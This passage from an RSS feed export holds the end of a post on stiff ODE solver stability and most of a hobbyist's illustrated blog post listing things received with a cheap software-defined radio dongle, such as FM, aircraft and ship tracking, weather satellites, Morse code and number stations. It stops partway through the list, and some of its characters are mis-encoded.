    &lt;p&gt;I said that generally implicit methods that you use are A-stable. That’s also a small lie to make the narrative simpler. The BDF methods which Sundials, DASSL, LSODE, FBDF, etc. use are actually α-stable, which means that they are actually missing some angle α of the complex plane for stability. The stability regions look like this:&lt;/p&gt;
    &lt;p&gt;So these BDF methods are actually pretty bad for other reasons on very oscillatory problems! Meanwhile, things like Rosenbrock methods can also solve DAEs while actually being L-stable, which can make them more stable in many situations where there’s oscillations towards a steady state. So there’s a trade-off there… again every method has a purpose. But this is another “ode15s is more stable than ode23s”… “well actually…”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45262151</guid><pubDate>Tue, 16 Sep 2025 13:41:51 +0000</pubDate></item><item><title>Things you can do with a Software Defined Radio (2024)</title><link>https://blinry.org/50-things-with-sdr/</link><description>&lt;doc fingerprint="b604197b7163def1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Fifty Things you can do with a Software Defined Radio ð»&lt;/head&gt;
    &lt;p&gt;Last week, I went on an adventure through the electromagnetic spectrum!&lt;/p&gt;
    &lt;p&gt;Itâs like an invisible world that always surrounds us, and allows us to do many amazing things: Itâs how radio and TV are transmitted, itâs how we communicate using Wi-Fi or our phones. And there are many more things to discover there, from all over the world.&lt;/p&gt;
    &lt;p&gt;In this post, Iâll show you fifty things you can find there â all you need is this simple USB dongle and an antenna kit!&lt;/p&gt;
    &lt;head rend="h2"&gt;The âMake 50 of Somethingâ technique&lt;/head&gt;
    &lt;p&gt;A couple of years ago, I heard about the âMake 50 of Somethingâ technique in Vi Hartâs Fifty Fizzbuzzes. Since then, Iâve already made fifty programs for the fantasy console TIC-80 in one weekend in 2021.&lt;/p&gt;
    &lt;p&gt;I found that a very exciting experience â trying to make so many new things really pushed me to leave my comfort zone, to be creative, and not to get sucked into rabbit holes too deep.&lt;/p&gt;
    &lt;p&gt;I knew I definitely wanted to try the technique again. So, when I took a week of vacation, I decided to try to find 50 things to do with a Software Defined Radio!&lt;/p&gt;
    &lt;head rend="h2"&gt;What is an SDR?&lt;/head&gt;
    &lt;p&gt;A Software Defined Radio is essentially a radio that relies on a computer to do most of its data processing. It doesnât rely on analog hardware too much â instead, most of what is does is âdefined in softwareâ, hence the name.&lt;/p&gt;
    &lt;p&gt;Usually, SDRs can detect electromagnetic waves in a much wider range than a common FM radio, which makes it especially exciting! I got interested in SDRs after reading about Albertâs project to build one as a module for the Framework laptop!&lt;/p&gt;
    &lt;head rend="h2"&gt;What youâll need&lt;/head&gt;
    &lt;p&gt;I went into this week without much knowledge of the things Iâd find. Iâd read through a introductory course for aspiring amateur radio operators (more on that later), but I barely knew which way to point my antenna.&lt;/p&gt;
    &lt;p&gt;If you want to follow along, this section is intended to help you get started!&lt;/p&gt;
    &lt;p&gt;Most of the 50 things also have a little infobox at the beginning, explaining the frequencies, and some special knowledge needed to receive them.&lt;/p&gt;
    &lt;head rend="h3"&gt;Hardware&lt;/head&gt;
    &lt;p&gt;I looked into the topic a bit, and a popular, cheap SDR right now is the RTL-SDR Blog V4, which has the form factor of a simple SUB dongle. You can get it for around $30, or as a kit with telescopic antennas for $50.&lt;/p&gt;
    &lt;p&gt;Everything I tried during this week was done using this USB dongle, the antenna kit, and a long piece of wire!&lt;/p&gt;
    &lt;p&gt;(By the way, thereâs another great option if you donât want to buy anything â lots of people make their SDR accessible through the Internet! You can find a map here.)&lt;/p&gt;
    &lt;head rend="h3"&gt;Using the antennas&lt;/head&gt;
    &lt;p&gt;I tried to adjust my antenna to the desired frequencies as best as I could. I think for receiving, itâs not super important that your antenna is perfectly configured, though.&lt;/p&gt;
    &lt;p&gt;For most applications, I used the dipole antennas that came with the kit I purchased. Dipole antennas have two sides that stick out the same length. You generally wanna make the whole antenna half as long as the wave length you want to receive, and orient it vertically.&lt;/p&gt;
    &lt;p&gt;My rule of thumb was to divide 72 by the frequency in MHz, and take that as the length of each side of the dipole in meters. Thatâd make the whole antenna a bit shorter than half of the wavelength.&lt;/p&gt;
    &lt;p&gt;For example, this is what the configuration looked like for frequencies around 100 MHz:&lt;/p&gt;
    &lt;p&gt;And for higher frequencies, I used the tiny screw-on antennas from the kit:&lt;/p&gt;
    &lt;p&gt;For specific applications like receiving satellites, or receiving locators for airplanes, I used special configurations, but Iâll discuss these as we go!&lt;/p&gt;
    &lt;head rend="h3"&gt;Software&lt;/head&gt;
    &lt;p&gt;The software I liked best, and which I used for many things, was SDR++. It allows you to explore the frequency spectrum very smoothly, and has a modern user interface!&lt;/p&gt;
    &lt;p&gt;But I also used plenty of other software, on Linux in my case. Iâll link to the software as needed below.&lt;/p&gt;
    &lt;head rend="h2"&gt;Monday&lt;/head&gt;
    &lt;p&gt;On Monday morning, I was excited to start this project! I sat down at my desk, and got to work!&lt;/p&gt;
    &lt;head rend="h3"&gt;1: Listen to FM radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM (âfrequency modulationâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This as an obvious first thing to do, as the signals are very strong! I was using the SDR++ software, and it felt very nice browsing around and discovering the stations around me! It reminded me of exploring the radio as a child.&lt;/p&gt;
    &lt;p&gt;I found a local station that gives 1-hour slots to civic groups, for example!&lt;/p&gt;
    &lt;head rend="h3"&gt;2: Listen to Freenet&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 149.01-149.11 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a special frequency range in Germany: Anyone is allowed to send there, using licensed devices. There are 6 channels.&lt;/p&gt;
    &lt;p&gt;I think someone was testing their device there when I listened in. :D I heard a âHellooo?â, then a âTest, testâ, and then a âGeneral call to all stationsâ. Oh, and shortly after a short transmission on channel 3 in a Slavic-sounding language!&lt;/p&gt;
    &lt;p&gt;Freenet devices have a range of only a couple of kilometers, so these people must have been pretty close! :O&lt;/p&gt;
    &lt;head rend="h3"&gt;3: Receive weather conditions from airports&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Differs by airport, search term is âATISâ&lt;/item&gt;
      &lt;item&gt;Modulation: AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;While browsing the aviation frequencies, I found this station that reports weather conditions in an endless loop. It seems to be the âAutomatic Terminal Information Serviceâ of Hamburg airport!&lt;/p&gt;
    &lt;p&gt;Thanks to that, I found out that the current air pressure was 1011 hPa! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;4: Listen to airplane communication&lt;/head&gt;
    &lt;p&gt;Listening to âmessages not meant for the general publicâ is not allowed in Germany, so of course I didnât do that. And if I had accidentally done that, I wouldnât be allowed to tell you about it. ð&lt;/p&gt;
    &lt;head rend="h3"&gt;5: Track aircraft via ADS-B&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 1090 MHz&lt;/item&gt;
      &lt;item&gt;Protocol: ADS-B&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thatâs short for âAutomatic Dependent Surveillance â Broadcastâ. Aircraft send it automatically to be tracked.&lt;/p&gt;
    &lt;p&gt;For this, I built my first antenna! From wire and and an antenna connector called âSMAâ.&lt;/p&gt;
    &lt;p&gt;And it worked! \o/ I decoded the signal using the software SDRangel. Fascinating! I saw some big &amp;amp; small airplanes, and even a helicopter!&lt;/p&gt;
    &lt;head rend="h3"&gt;6: Listen to stereo FM radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How stereo audio is transmitted is really interesting, because itâs backwards-compatible to receivers that donât support it:&lt;/p&gt;
    &lt;p&gt;Here, you see the demodulated audio frequency spectrum, as shown in SDRangel. Below 19k Hz, itâs just mono audio. Then, to mark a stereo station, thereâs a constant âpilot toneâ at 19k Hz! (Outside of what most humans can hear.)&lt;/p&gt;
    &lt;p&gt;Then, if you double the frequency of the pilot tone, you can derive the sections where the difference of the left &amp;amp; right channel to the mono channel is transmitted!&lt;/p&gt;
    &lt;p&gt;Correction: Iâve been told that instead of what I call âleftâ and ârightâ in this diagram, the upper frequencies transmit the difference of the left and right channels! That way, the receiver can calculate the left and right channels from the mono signal (which is, esseutially, the sum of left and right).&lt;/p&gt;
    &lt;head rend="h3"&gt;7: Receive road traffic information&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 87.5-108 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you triple the frequency of the pilot tone, you get to a range where FM stations transmit small amounts of digital metadata, like the name and genre of the station, and the current song! Thatâs a protocol called Radio Data System.&lt;/p&gt;
    &lt;p&gt;This system can also transmit road traffic information! There seemed to be a road closure at â0x64BEâ, as decoded by SDRangel.&lt;/p&gt;
    &lt;p&gt;The Federal Highway Research Institute publishes an Excel table, where I could look up that this is a town in Lower Saxony!&lt;/p&gt;
    &lt;head rend="h3"&gt;8: Listen to conversations on the 2-meter amateur radio band&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 144-146 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a frequency range reserved for amateur radio operators â for non-commercial use only. You may send on this band after getting a license.&lt;/p&gt;
    &lt;p&gt;What I found here is seemingly a conversation circle facilitated by a relay around 15 km away from here â it takes input on a certain frequency, and outputs an amplified copy of it on another frequency! Klaus, Bernd, JÃ¼rgen and Horst were talking about antennas, relays, and Windows XP! ð&lt;/p&gt;
    &lt;head rend="h3"&gt;9: Listen to digital radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 174-240 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The SDRangel software also has a demodulator for Digital Audio Broadcast! :O I continue to be amazed by it!&lt;/p&gt;
    &lt;p&gt;I think this was the first time Iâve received digital radio via air! I saw so many stations, and Iâve only checked a couple of channels.&lt;/p&gt;
    &lt;p&gt;The advantage of this digital channel is that thereâs no noise. And I even saw a âcover imageâ in one of the programs!&lt;/p&gt;
    &lt;head rend="h3"&gt;10: Listen to PMR446&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 446.0-446.2 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a frequency range for âPrivate Mobile Radioâ. Itâs another of these bands where anyone can transmit using a licensed device!&lt;/p&gt;
    &lt;p&gt;Not a lot of activity here. I heard âHello, hellooo!â, âCan you hear me?â and some short transmissions that sounded like a child! :D&lt;/p&gt;
    &lt;p&gt;There also seemed to be digital transmissions, but I didnât know how to decode them yet.&lt;/p&gt;
    &lt;p&gt;The range of PMR446 devices is pretty low (a couple of hundred metres in cities), so again, the people mustâve been close!&lt;/p&gt;
    &lt;head rend="h2"&gt;Tuesday&lt;/head&gt;
    &lt;p&gt;After the first day of SDR experiments, I was amazed how much invisible communication is going on around us in the electromagnetic spectrum at the same time!&lt;/p&gt;
    &lt;p&gt;I posted each of these things on Mastodon as I went, and asked people for suggestions for more things I could receive.&lt;/p&gt;
    &lt;head rend="h3"&gt;11: Read your neighborsâ sensors&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 433.05-434.79 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At 433 MHz, thereâs a frequency band for âindustrial, scientific and medicalâ applications. And wow, there was quite a lot of activity nearby!&lt;/p&gt;
    &lt;p&gt;Using the decoder rtl_433, I saw two sensors that output the current temperature, humidity, and air pressure!&lt;/p&gt;
    &lt;p&gt;There were also some âIBIS beaconsâ flying by, which are used in public transportation, so maybe itâs buses driving by?&lt;/p&gt;
    &lt;p&gt;Later, an âInterlogix Securityâ device also appeared, reporting âclosed switch statesâ :O&lt;/p&gt;
    &lt;head rend="h3"&gt;12: Track ships!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 162.025 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ships send out their status using AIS (Automatic Identification System). And again, I received a lot of them here in Hamburg! :O&lt;/p&gt;
    &lt;p&gt;I was especially excited to receive data from the MS Stubnitz (a fisher boat that was turned into a culture center/techno club)! It reports its status as âmooredâ, and its speed as 0.1 knots! :D&lt;/p&gt;
    &lt;p&gt;Again, I used the software SDRangel. Apparently, it can also display a 3D map, but I havenât figured out how to add 3D modelsâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;13: Detect GSM activity&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 876-959 MHz, I looked up the specific ranges for Germany on Wikipedia&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was curious whether you could tell if someone used their phone! So I borrowed a GSM phone, tuned to the correct frequencies, and made some test calls.&lt;/p&gt;
    &lt;p&gt;What surprised me most: You can kind of âseeâ the volume at which I was talking!?&lt;/p&gt;
    &lt;p&gt;In the recording, the three dense bands at the end were when I was humming into the phone at the other end. This only worked in the âreceivingâ direction.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wednesday&lt;/head&gt;
    &lt;head rend="h3"&gt;14: Receive signals from a satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 136-138 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I spent all Tuesday afternoon and evening learning about satellites. The program gpredict is really nice to find out when satellites will pass overhead! I learned a lot, including that one satellite I was trying to receive burned up last week! :D&lt;/p&gt;
    &lt;p&gt;I was super excited when I first received a signal from a NOAA satellite! ð°ï¸&lt;/p&gt;
    &lt;p&gt;But I didnât manage to decode it properly yet. Maybe my reception was too noisy? I wanted to keep trying, but I had to move on.&lt;/p&gt;
    &lt;head rend="h3"&gt;15: Admire TETRA signals&lt;/head&gt;
    &lt;p&gt;In Germany, the police has switched to an encrypted digital protocol called TETRA.&lt;/p&gt;
    &lt;p&gt;Even though Iâve seen some interesting talks at CCC events about weaknesses in the decryption, all I wanted to do for now is looking at the pretty signals in SDR++. :3&lt;/p&gt;
    &lt;head rend="h3"&gt;16: Listen to taxi dispatchers&lt;/head&gt;
    &lt;p&gt;Again, this is communication not meant for the general public.&lt;/p&gt;
    &lt;p&gt;I didnât listen to someone dispatching taxis to specific addresses, and you also shouldnât do that either. ð&lt;/p&gt;
    &lt;p&gt;Stay away from a site called âfrequenzdatenbankâ!&lt;/p&gt;
    &lt;head rend="h3"&gt;17: Ponder mysterious signals&lt;/head&gt;
    &lt;p&gt;Some of the most fun I had was just browsing frequencies and seeing what I can find! Sometimes, I encountered signals I canât identify.&lt;/p&gt;
    &lt;p&gt;For example, at 865-868 MHz, there was a family of slow, continuous, digital signals that made a nice melody when listened to in single-sideband demodulation!&lt;/p&gt;
    &lt;p&gt;And at 177-180 MHz, there were two very broadband transmissions. Might be TV? But I couldnât find out what type. (It later turned out that Iâd already listened to these signals â it was digital radio, DAB+.)&lt;/p&gt;
    &lt;head rend="h3"&gt;18: Track weather balloons&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 400-405.9 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As I was browsing around for things to receive, I saw on this tracking website that a radiosonde was just launched in Hamburg! SDRangel could decode its transmission! It had climbed to a height of 7 km, and itâs -17 Â°C there!&lt;/p&gt;
    &lt;p&gt;I knew that it would eventually burst and fall back to Earth, and that I could try to get to it and find it!&lt;/p&gt;
    &lt;head rend="h3"&gt;19: Hunt weather balloons!&lt;/head&gt;
    &lt;p&gt;I decided to go on a field trip, using trains and my bike.&lt;/p&gt;
    &lt;p&gt;I was following the tracker. The balloon popped earlier than predicted, and I frantically changed travel plans!&lt;/p&gt;
    &lt;p&gt;Eventually, it landed in a forest. I hoped I could get to it! What made this adventure more tricky was that my mobile Internet contract ran out while I was on the go, and my battery was also almost empty.&lt;/p&gt;
    &lt;p&gt;But I made it to the forest, and entered it.&lt;/p&gt;
    &lt;p&gt;As I circled the site, I encountered a person in their 60s, with a stubbly beard and a blue wool hat. He was looking in the direction of the crash site, and was holding a smartphone, so I asked him whether he also was looking for the radiosonde.&lt;/p&gt;
    &lt;p&gt;He was! We looked for it together for half an hour, jumping over small rivers and crawling through the woods, while he gave me a lot of tips related to hunting sondes.&lt;/p&gt;
    &lt;p&gt;He told me that he had found around 40 of them so far!&lt;/p&gt;
    &lt;p&gt;Usually, the sondes keep broadcasting after landing, but this one wasnât. So he quickly guessed that someone else couldâve taken it. Or maybe it landed in the water and died?&lt;/p&gt;
    &lt;p&gt;Some pictures of the area we searched:&lt;/p&gt;
    &lt;p&gt;Eventually, we gave up, and walked back to our vehicles. He also is an amateur radio operator, and could answer a couple of questions related to building antennas!&lt;/p&gt;
    &lt;p&gt;And he was right: Someone had been faster than us! The status was changed. So in the end, I didnât find the sonde. But something that might be even better â a friend!&lt;/p&gt;
    &lt;head rend="h3"&gt;20: Receive amateur packet radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 144.8 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In the 2-meter amateur band, there are certain frequencies for the âAutomatic Packet Reporting Systemâ. Itâs a bit like IP â packets have a âfromâ and a âtoâ. They can also broadcast their position, or weather data.&lt;/p&gt;
    &lt;p&gt;Some stations seem to announce themselves as repeaters, which probably help forward the packets to increase the range.&lt;/p&gt;
    &lt;p&gt;And two people seemed to be on a âfielddayâ, and broadcasted their location. :D&lt;/p&gt;
    &lt;p&gt;SDRangel can create a map automatically:&lt;/p&gt;
    &lt;head rend="h2"&gt;Thursday&lt;/head&gt;
    &lt;p&gt;I started the day by building an antenna!&lt;/p&gt;
    &lt;p&gt;This was going to be a simple ârandom wireâ antenna, to allow me to get better reception in the lower frequencies, which Iâve omitted so far (because I knew it would be much more fun with a better antenna)!&lt;/p&gt;
    &lt;p&gt;I measured out 21.6 m of wire (which for â¨magicâ¨ reasons seem to be a good universal antenna length)â¦&lt;/p&gt;
    &lt;p&gt;â¦directly attached it to the center of another SMA connectorâ¦&lt;/p&gt;
    &lt;p&gt;â¦and draped it all around my room!&lt;/p&gt;
    &lt;p&gt;People on the Internet say that there are many problems with this â that it would be better to have it outside, and that thereâs an impedance mismatch between the receiver and the wire.&lt;/p&gt;
    &lt;p&gt;I could address those problems, but I wanna try how well this works first :)&lt;/p&gt;
    &lt;head rend="h3"&gt;21: Receive Morse code from other countries&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 10.10-10.13 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW (âcontinuous waveâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On the 30-meter amateur band, I found people sending Morse code! :O&lt;/p&gt;
    &lt;p&gt;Iâd been learning it a little bit, so if I recorded it and slowed it down, I could understand it: Theyâre sending their callsigns. These are from Belgium, France, and Italy! \o/&lt;/p&gt;
    &lt;p&gt;I compared to my 2-meter dipole antenna, and the reception was definitely better â I can pick up more transmissions, and with much less noise!&lt;/p&gt;
    &lt;head rend="h3"&gt;22: Receive maritime weather reports&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 11.039 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The German Weather Service broadcasts maritime information throughout the day on various shortwave frequencies.&lt;/p&gt;
    &lt;p&gt;They use a protocol called RTTY (radioteletype), and it took me a while to decode it. But I found a neat little program called âfldigiâ: You can pipe audio to it (single side band modulation), and then if you pick the correct settings (see screenshot), it happily transcribes the messages!&lt;/p&gt;
    &lt;p&gt;Hereâs the station weather reports for the Baltic Sea and Northern Sea!&lt;/p&gt;
    &lt;head rend="h3"&gt;23: Receive digimodes from other countries&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 10.130-10.15 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I found some other strange signals on the 30-meter band. The Signal Identification Wiki was really helpful for figuring out what they were: FT8!&lt;/p&gt;
    &lt;p&gt;FT8 is quite a new protocol, invented in 2017, and it seems to be super popular right now! It allows you to transmit short messages, and again, people are looking for people to talk to (CQ), saying how well they receive each other, or saying goodbye (73).&lt;/p&gt;
    &lt;p&gt;This is the WSJT-X software.&lt;/p&gt;
    &lt;head rend="h3"&gt;24: Detect whether your notebook is charging&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Below 1 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As I was browsing the very low-frequency bands, I had a strange problem: Sometimes, that would work okayish, sometimes I could even make out voices!&lt;/p&gt;
    &lt;p&gt;But other times, it wouldnât work at all, and everything would be loud, angry noise. Even in regions where I had better reception before!&lt;/p&gt;
    &lt;p&gt;Eventually, I found out how to solve that issue â by unplugging my notebook charger. Dâoh! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;25 &amp;amp; 26: See ionosondes and radar signals&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 6-30 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In the low frequencies, occasionally, you can hear a short chirp! :D These are caused by ionosondes, scientific instruments which measure the properties of the ionosphere by sweeping a wide frequency spectrum.&lt;/p&gt;
    &lt;p&gt;Another signal (which I accidentally got in the same screenshot) is a radar system â in this case, according to the Signal Identification Wiki, itâs a âCODARâ system, used to measure the motion of water waves and currents along coasts! :O&lt;/p&gt;
    &lt;head rend="h3"&gt;27: Listen to âsingle side bandâ conversations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: In all amateur bands, especially the ones below 30 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: SSB (âsingle side bandâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How do you transmit speech over long distances? You can use âamplitude modulationâ, where you change the volume of the carrier frequency to model your audio.&lt;/p&gt;
    &lt;p&gt;As a side effect, the bands to the sides of the carrier will contain a signal, as well.&lt;/p&gt;
    &lt;p&gt;One trick is to transmit just those sidebands, which saves power! But you have to âguessâ the base frequency when listening. Depending on which part you transmit, this is called âlower side bandâ or âupper side bandâ.&lt;/p&gt;
    &lt;p&gt;SDR++ makes it very easy to play with this! :) Hereâs someone from Serbia!&lt;/p&gt;
    &lt;head rend="h3"&gt;28: Listen to AM radio from the other side of the world&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Shortwave bands below 26 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At night, low-frequency radio waves can travel further around the world, because theyâre reflected by the layers of the ionosphere! Thereâs something magical about this.&lt;/p&gt;
    &lt;p&gt;I put my antenna outside, and I could hear a lot of broadcasting stations! On short-wave.info, you can look up where they are located.&lt;/p&gt;
    &lt;p&gt;Some stations in China are broadcasting with very high power! Some I could hear were over 7500 km away.&lt;/p&gt;
    &lt;p&gt;Wow. Itâs full of stars! ð&lt;/p&gt;
    &lt;head rend="h2"&gt;Friday&lt;/head&gt;
    &lt;p&gt;Originally, I had planned the project to run from Monday to Friday. When I still had 32 things to do in Friday morning, I knew Iâd need to extend it. But I hadnât run out of ideas yet:&lt;/p&gt;
    &lt;head rend="h3"&gt;29: Listen to CB radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 26.965-27.405 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM or AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;After Iâd looked into the low frequencies on Thursday, I went to a higher band again: The Citizens Band!&lt;/p&gt;
    &lt;p&gt;This is the third frequency band Iâm aware of where anyone is allowed to transmit â provided that you use a licensed device!&lt;/p&gt;
    &lt;p&gt;This is a band where my random wire antenna really came in handy. Without it, I would have had a hard time understanding anything. And even with it, transmissions are extremely noisy.&lt;/p&gt;
    &lt;p&gt;CB radio is used internationally, especially by truck drivers, it seems.&lt;/p&gt;
    &lt;head rend="h3"&gt;30: Assess the propagation of radio waves using beacons&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 14.100, 18.110, 21.150, 24.930, and 28.200 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The International Beacon Project runs a network of 18 stations, which take turns transmitting their callsigns at certain frequencies.&lt;/p&gt;
    &lt;p&gt;Using this system, you can quickly get a sense of how well radio waves are currently propagating to your location. Clever!&lt;/p&gt;
    &lt;p&gt;I picked up the beacon from southern Finland! You can see its callsign scrolling away in the video. Itâs followed by four dashes send with decreasing power. I only heard the first oneâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;31: Receive a time signal&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 9996 kHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I wouldâve loved to receive DCF77, which powers the radio clocks in Germany! But no matter how hard I listened to 77.5 kHz, there was nothing there. I donât think my dongle can do that.&lt;/p&gt;
    &lt;p&gt;So I used higher frequencies! Russia transmits its âRWMâ time signal at 9996 kHz, which beeps every second, with a long beep for the full minute.&lt;/p&gt;
    &lt;p&gt;Not enough to tell the time, but enough to adjust your wrist watch, I guess!&lt;/p&gt;
    &lt;head rend="h3"&gt;32: Receive a weather fax&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 3855, 7880, and 13882.5 kHz (see weatherfax.com for more)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The German Weather Service broadcasts weather maps throughout the day! You can decode them using fldigiâs âWEFAX-576â setting.&lt;/p&gt;
    &lt;p&gt;I caught this one only halfway through. According to the schedule, itâs the âSurface weather chart North Atlantic, Europeâ!&lt;/p&gt;
    &lt;p&gt;If you squint really hard, you can make out the coast of Spain and the Mediterranean Sea on the right side!&lt;/p&gt;
    &lt;head rend="h3"&gt;33: Decode images from a weather satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 137.62, 137.9125, and 137.1 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I couldnât stop trying to capture a weather satellite, itâs just too cool to receive an image from space!&lt;/p&gt;
    &lt;p&gt;That evening, an American satellite called NOAA-15 passed right over us, so I thought Iâd try again. And this time, I got parts of an image! \o/&lt;/p&gt;
    &lt;p&gt;This is real-time data! At night, both transmitted images are infrared recordings.&lt;/p&gt;
    &lt;p&gt;I recorded the FM signal using SDR++, and then decoded the image using noaa-apt, which also added country outlines.&lt;/p&gt;
    &lt;head rend="h3"&gt;34: Estimate the speed of satellites&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 136-138 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Hereâs what the NOAA-15 weather satellite sounds like, by the way! tick-tock&lt;/p&gt;
    &lt;p&gt;While recording, I noticed something strange: The transmission didnât happen at the frequency I had expected it to! And also, the frequency changed.&lt;/p&gt;
    &lt;p&gt;Then it hit me: Doppler effect! At the time of the recording, the frequency was around 4250 Hz higher than expected.&lt;/p&gt;
    &lt;p&gt;After looking up the formula, I calculated a relative speed of 9 km/s! (Which got close to its real speed, 7.5 km/s.)&lt;/p&gt;
    &lt;head rend="h3"&gt;35: Listen to number stations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 5-30 MHz?&lt;/item&gt;
      &lt;item&gt;Modulation: Differs by station&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These stations send encrypted messages using number sequences, possibly for espionage purposes!&lt;/p&gt;
    &lt;p&gt;So why not listen to one? Thereâs a surprisingly well-maintained database of them on a site call Priyom.&lt;/p&gt;
    &lt;p&gt;So I tuned into the next frequency that was listed, and: Bingo!&lt;/p&gt;
    &lt;p&gt;Allegedly, this was a station in Moscow. That day, it sent â218, 218, 218â in a loop, followed by three long beeps, which is the format of a ânull messageâ.&lt;/p&gt;
    &lt;p&gt;So no news for the Russian spies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Saturday&lt;/head&gt;
    &lt;p&gt;The week was really intense for me. Initially, I thought Iâd do 10 things per day, but it turned out that that was too much. I had to learn so many new things.&lt;/p&gt;
    &lt;p&gt;Many things I tried donât work on my first attempt. Finding LoRaWAN signals, decoding packet radio, finding something on PMR446, decoding the satellite â those were all things that required a second (or third) attempt.&lt;/p&gt;
    &lt;p&gt;This project was exhausting, but also joyful â having committed to it, I got in a nice flow state, where I could focus on it for hours.&lt;/p&gt;
    &lt;p&gt;Often, I thought: âOkay, this is it. I canât possibly find more things.â But this is the power of the 50 Things technique: I have to keep looking, leave my comfort zone, be creative, try things I otherwise wouldnât have tried!&lt;/p&gt;
    &lt;p&gt;So, 15 more things, huh?&lt;/p&gt;
    &lt;head rend="h3"&gt;36: Receive images from amateur radio operators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 14.230, 14.233, 21.340, 28.680, 145.625 MHz seem to be popular&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using a protocol called âSSTVâ (slow-scan television), amateur radio operators send each other postcards! :D&lt;/p&gt;
